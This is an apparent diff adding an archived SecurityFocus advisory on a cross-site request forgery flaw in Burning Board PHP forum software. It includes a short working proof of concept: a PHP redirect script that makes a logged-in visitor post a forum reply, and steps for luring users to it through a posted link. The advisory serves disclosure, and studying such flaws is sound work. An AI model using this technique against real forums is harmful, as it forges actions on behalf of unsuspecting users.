@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/4512/info
+
+Burning Board is web forum software. It is written in PHP, back-ended by MySQL, and will run on most Unix and Linux variants as well as Microsoft Windows.
+
+An attacker may allegedly create a malicious link which is capable of causing actions to be performed on the behalf of a legitimate Burning Board user who visits the link. To exploit this vulnerability, the attacker must manipulate URL parameters in the malicious link in such a way as to cause the desired actions to be performed by a user who visits the link. The legitimate forum user must also be authenticated via a cookie-based authentication credential. The malicious link may include BBCode.
+
+It has been reported, but not confirmed, that other web forum software (such as phpBB) may also be affected by this vulnerability. 
+
+1. Create a script exploit.php
+
+exploit.php // with php U can dynamicaly redirect to the same treads & boardid (parsing $HTTP_REFERER)
+<?php
+header ("Location:
+http://localhost/wbboard/reply.php?threadid=7&boardid=58&action=send&subject=check%20this%20out&message=test[IMG]http://localhost/~seazon/art/
+eros/236.jpg[/IMG]&signature=1"); /* Redirect browser*/
+?>
+
+
+2.Register in forum
+3.Send a message like this
+"Hey, I know how to exploit this forum [URL]http://host.com/exploit.php[/URL]" 
